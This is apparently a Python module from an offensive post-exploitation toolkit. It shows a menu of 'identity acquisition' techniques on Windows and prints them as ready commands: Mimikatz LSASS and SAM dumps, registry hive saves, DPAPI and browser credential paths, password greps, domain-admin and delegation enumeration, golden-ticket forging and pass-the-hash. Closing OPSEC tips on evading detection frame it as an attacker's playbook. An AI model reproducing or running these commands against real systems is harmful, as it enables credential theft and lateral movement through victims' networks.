"""Identity Acquisition Module"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console


class IdentityModule:
    """Module for identity acquisition and credential harvesting"""
    
    def run(self, console: Console, session_data: dict):
        """Run identity acquisition module"""
        while True:
            console.print(Panel(
                "[bold]Identity Acquisition[/bold]\n\n"
                "Harvest credentials and understand domain context for lateral movement.",
                title="Module 3",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Local Credential Sources")
            table.add_row("2", "Credential Store Access")
            table.add_row("3", "Configuration Secrets")
            table.add_row("4", "User Artifacts")
            table.add_row("5", "Domain Context & Delegation")
            table.add_row("6", "Token & Ticket Extraction")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6'], default='0')
            
            if choice == '0':
                break
            elif choice == '1':
                self._local_credentials(console, session_data)
            elif choice == '2':
                self._credential_store(console, session_data)
            elif choice == '3':
                self._config_secrets(console, session_data)
            elif choice == '4':
                self._user_artifacts(console, session_data)
            elif choice == '5':
                self._domain_context(console, session_data)
            elif choice == '6':
                self._tokens_tickets(console, session_data)
            
            console.print()
    
    def _local_credentials(self, console: Console, session_data: dict):
        """Explore local credential sources"""
        console.print("\n[bold cyan]Local Credential Sources[/bold cyan]\n")
        
        sources = {
            "Windows Credential Manager": [
                "cmdkey /list",
                "vaultcmd /list",
                "Get-StoredCredential"
            ],
            "LSASS Memory": [
                "Mimikatz: sekurlsa::logonpasswords",
                "Procdump + Mimikatz offline",
                "Task Manager → Dump LSASS"
            ],
            "SAM Database": [
                "reg save HKLM\\SAM sam.save",
                "reg save HKLM\\SYSTEM system.save",
                "Mimikatz: lsadump::sam"
            ],
            "LSA Secrets": [
                "reg save HKLM\\SECURITY security.save",
                "Mimikatz: lsadump::secrets"
            ],
            "DPAPI": [
                "Mimikatz: dpapi::cred",
                "SharpDPAPI",
                "Get-Content $env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Credentials\\*"
            ]
        }
        
        for source, methods in sources.items():
            console.print(f"[bold]{source}:[/bold]")
            for method in methods:
                console.print(f"  • {method}")
            console.print()
    
    def _credential_store(self, console: Console, session_data: dict):
        """Access credential stores"""
        console.print("\n[bold cyan]Credential Store Access[/bold cyan]\n")
        
        stores = [
            ("cmdkey /list", "List stored credentials"),
            ("vaultcmd /list", "Windows Vault credentials"),
            ("[PowerShell] Get-StoredCredential", "PowerShell credential access"),
            ("[PowerShell] $cred = Get-StoredCredential -Target <target>; $cred.GetNetworkCredential()", "Retrieve specific credential"),
        ]
        
        table = Table(title="[bold]Credential Store Commands[/bold]", box=box.ROUNDED)
        table.add_column("Command", style="cyan")
        table.add_column("Purpose", style="white")
        
        for cmd, purpose in stores:
            table.add_row(cmd, purpose)
        
        console.print(table)
        console.print()
        
        console.print("[bold]Target Locations:[/bold]")
        locations = [
            "Current user: %APPDATA%\\Microsoft\\Credentials\\",
            "System: C:\\Windows\\System32\\config\\",
            "Vault: %APPDATA%\\Microsoft\\Vault\\"
        ]
        
        for loc in locations:
            console.print(f"  • {loc}")
    
    def _config_secrets(self, console: Console, session_data: dict):
        """Find configuration secrets"""
        console.print("\n[bold cyan]Configuration Secrets[/bold cyan]\n")
        
        targets = {
            "Application Config Files": [
                "web.config, app.config (connection strings)",
                "*.ini, *.conf files",
                "Environment variables"
            ],
            "Backup Scripts": [
                "Batch files with credentials",
                "PowerShell scripts with plaintext passwords",
                "Scheduled task scripts"
            ],
            "Monitoring Agents": [
                "Nagios, Zabbix configs",
                "SCOM agent configs",
                "Backup agent configs (Veeam, Backup Exec)"
            ],
            "Database Configs": [
                "SQL Server connection strings",
                "MySQL my.cnf",
                "PostgreSQL pg_hba.conf"
            ],
            "Service Configs": [
                "IIS application pool identities",
                "Service account configs",
                "GMSA (Group Managed Service Accounts)"
            ]
        }
        
        console.print("[bold]Search Commands:[/bold]")
        search_cmds = [
            "Get-ChildItem -Recurse -Include *.config,*.ini,*.conf | Select-String -Pattern 'password|pwd|pass' -CaseSensitive:$false",
            "Get-ChildItem -Recurse -Include *.bat,*.ps1,*.vbs | Select-String -Pattern 'password|pwd|pass' -CaseSensitive:$false",
            "Get-Content C:\\ProgramData\\*\\config\\* | Select-String -Pattern 'password|pwd|pass'"
        ]
        
        for cmd in search_cmds:
            console.print(f"  • {cmd}")
        console.print()
        
        for category, items in targets.items():
            console.print(f"[bold]{category}:[/bold]")
            for item in items:
                console.print(f"  • {item}")
            console.print()
    
    def _user_artifacts(self, console: Console, session_data: dict):
        """Harvest user artifacts"""
        console.print("\n[bold cyan]User Artifacts[/bold cyan]\n")
        
        artifacts = {
            "RDP History": [
                "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Default\"",
                "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\"",
                "Get-ItemProperty \"HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*\""
            ],
            "Cached Logons": [
                "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
                "Mimikatz: lsadump::cache",
                "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
            ],
            "Browser Data": [
                "Chrome: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
                "Edge: %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                "Firefox: %APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\logins.json"
            ],
            "Password Managers": [
                "KeePass: %APPDATA%\\KeePass\\",
                "LastPass: %APPDATA%\\LastPass\\",
                "1Password: %LOCALAPPDATA%\\1Password\\"
            ],
            "SSH Keys": [
                "%USERPROFILE%\\.ssh\\id_rsa",
                "%USERPROFILE%\\.ssh\\id_ed25519",
                "%USERPROFILE%\\.ssh\\config"
            ]
        }
        
        for artifact, locations in artifacts.items():
            console.print(f"[bold]{artifact}:[/bold]")
            for loc in locations:
                console.print(f"  • {loc}")
            console.print()
    
    def _domain_context(self, console: Console, session_data: dict):
        """Understand domain context and delegation"""
        console.print("\n[bold cyan]Domain Context & Delegation[/bold cyan]\n")
        
        console.print("[bold]Domain Information:[/bold]")
        domain_cmds = [
            "net group /domain",
            "net group \"Domain Admins\" /domain",
            "net group \"Enterprise Admins\" /domain",
            "net group \"Schema Admins\" /domain",
            "net group \"Account Operators\" /domain",
            "net group \"Backup Operators\" /domain",
            "[PowerShell] Get-ADDomain",
            "[PowerShell] Get-ADForest"
        ]
        
        for cmd in domain_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Delegation Checks:[/bold]")
        delegation_cmds = [
            "[PowerShell] Get-ADUser -Filter {TrustedForDelegation -eq $true}",
            "[PowerShell] Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}",
            "[PowerShell] Get-ADComputer -Filter {TrustedForDelegation -eq $true}",
            "[PowerShell] Get-ADUser -Properties * | Where-Object {$_.ServicePrincipalName -ne $null}",
            "[PowerShell] Get-ADUser -Properties msDS-AllowedToDelegateTo"
        ]
        
        for cmd in delegation_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Key Questions:[/bold]")
        questions = [
            "Which identities intersect this machine?",
            "What are their group memberships?",
            "Unconstrained/misconfigured delegation?",
            "Service accounts with broad rights?",
            "Where are these identities valid?"
        ]
        
        for q in questions:
            console.print(f"  • {q}")
    
    def _tokens_tickets(self, console: Console, session_data: dict):
        """Extract tokens and tickets"""
        console.print("\n[bold cyan]Token & Ticket Extraction[/bold cyan]\n")
        
        methods = {
            "Token Manipulation": [
                "Mimikatz: token::whoami",
                "Mimikatz: token::list",
                "Mimikatz: token::elevate",
                "Incognito: list_tokens",
                "RottenPotato / JuicyPotato (if SeImpersonate)"
            ],
            "Kerberos Tickets": [
                "Mimikatz: kerberos::list",
                "Mimikatz: kerberos::golden (golden ticket)",
                "Mimikatz: kerberos::tgt (TGT extraction)",
                "Rubeus: klist",
                "Rubeus: dump",
                "Rubeus: golden /krbtgt:<hash>"
            ],
            "NTLM Hashes": [
                "Mimikatz: sekurlsa::logonpasswords",
                "Mimikatz: lsadump::sam",
                "Mimikatz: lsadump::secrets",
                "Mimikatz: lsadump::dcsync (if DC access)"
            ],
            "Pass-the-Hash": [
                "Mimikatz: sekurlsa::pth /user:<user> /ntlm:<hash>",
                "WMI: wmic /node:<target> /user:<user> /password:<hash> process call create",
                "Psexec with NTLM hash"
            ]
        }
        
        for method, tools in methods.items():
            console.print(f"[bold]{method}:[/bold]")
            for tool in tools:
                console.print(f"  • {tool}")
            console.print()
        
        console.print("[bold]OPSEC Note:[/bold]")
        console.print("  • Prefer token manipulation over credential extraction when possible")
        console.print("  • Use built-in Windows mechanisms (runas, etc.)")
        console.print("  • Minimize use of external tools")
